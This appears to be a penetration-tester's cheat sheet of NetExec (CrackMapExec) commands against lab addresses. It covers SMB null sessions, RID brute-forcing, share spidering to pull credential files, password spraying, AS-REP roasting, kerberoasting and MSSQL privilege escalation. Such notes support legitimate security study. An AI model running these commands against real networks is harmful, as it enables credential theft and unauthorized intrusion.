# CrackMapExec


```shell
# Command Format
netexec [protocol] 10.10.10.1/24

# Export Function
--export $(pwd)/export.txt
```

- SMB Enumeration

```shell
netexec smb 192.168.133.0/24

# Getting all Hosts with SMB Signing Disabled
--gen-relay-list relaylistOutputFilename.txt

# NULL Session
netexec smb 10.129.203.121 -u '' -p ''

# Guest session
netexec smb 10.129.203.121 -u 'guest' -p ''

# Enumerating AD details
--users
--pass-pol
--groups
--rid-brute # IMPORTANT

# Filtering users
sed -i "s/'/\"/g" users.txt
jq -r '.[]' users.txt > userslist.txt

# Enumerating shares
--shares -M spider_plus
-M spider_plus -o EXCLUDE_DIR=IPC$,print$,NETLOGON,SYSVOL
-M spider_plus -o EXCLUDE_DIR=ADMIN$,IPC$,print$,NETLOGON,SYSVOL READ_ONLY=false

--spider IT --pattern txt
--spider IT --regex .
--spider IT --content --regex Encrypt
--share IT --get-file Creds.txt Creds.txt
--share IT --put-file /etc/passwd passwd
```

> Passwords may not contain the user's sAMAccountName (user account name) value or entire displayName (full name value). Both checks aren't case-sensitive.

- Password brute force

```shell
# SMB
netexec smb 10.129.203.121 -u users.txt -p password
netexec smb 10.129.203.121 -u user1 user2 user3 -p password
netexec smb 10.129.203.121 -u user1 user2 user3 -p password1 password2

# Winrm
netexec winrm 10.129.203.121 -u users.txt -p password

# LDAP
netexec ldap 10.129.203.121 -u users.txt -p password

# MSSQL
netexec mssql 10.129.203.121 -u user -p password -d $DOMAIN
netexec mssql 10.129.203.121 -u user -p password -d . # Local Windows account
netexec mssql 10.129.203.121 -u user -p password --local-auth # MSSQL Account

# Options
--continue-on-success
--no-bruteforce
--local-auth
```

> In the case of the message STATUS_PASSWORD_MUST_CHANGE, we can change the user's password using Impacket smbpasswd like: smbpasswd -r domain -U user.

- ASREPRoasting and kerberoasting

```shell
netexec ldap 10.129.204.177 -u user -p password --asreproast asreproast.out
netexec ldap 10.129.204.177 -u user -p password --kerberoasting kerberoasting.out
```

- Modules

```shell
# List modules
netexec ldap -L

# List options of module
netexec ldap -M MAQ --options

# Run module with options
netexec ldap 10.10.101.10 -u user -p password -M user-desc -o KEYWORDS=pwd,admin

# View source code
cat netexec/nxc/modules/user_description.py |grep keywords

# View module logs
cat /home/user/.nxc/logs/UserDesc-10.129.203.121-20221031_120444.log

# Fetching module
cd netexec/nxc/modules/
wget https://raw.githubusercontent.com/Porchetta-Industries/CrackMapExec/7d1e0fdaaf94b706155699223f984b6f9853fae4/cme/modules/groupmembership.py -q
```

- MSSQL

```shell
netexec mssql 10.129.204.177 -u user -p password -M mssql_priv -o ACTION=privesc
netexec mssql 10.129.204.177 -u user -p password -M mssql_priv -o ACTION=rollback

# Queries
-q "SELECT name FROM master.dbo.sysdatabases"
-q "SELECT name FROM master.dbo.sysdatabases" 
-q "SELECT table_name from core_app.INFORMATION_SCHEMA.TABLES" 
-q "SELECT * from [core_app].[dbo].tbl_users"

# Put and download files
--put-file /etc/passwd C:/Users/Public/passwd
--get-file C:/Windows/System32/drivers/etc/hosts hosts
```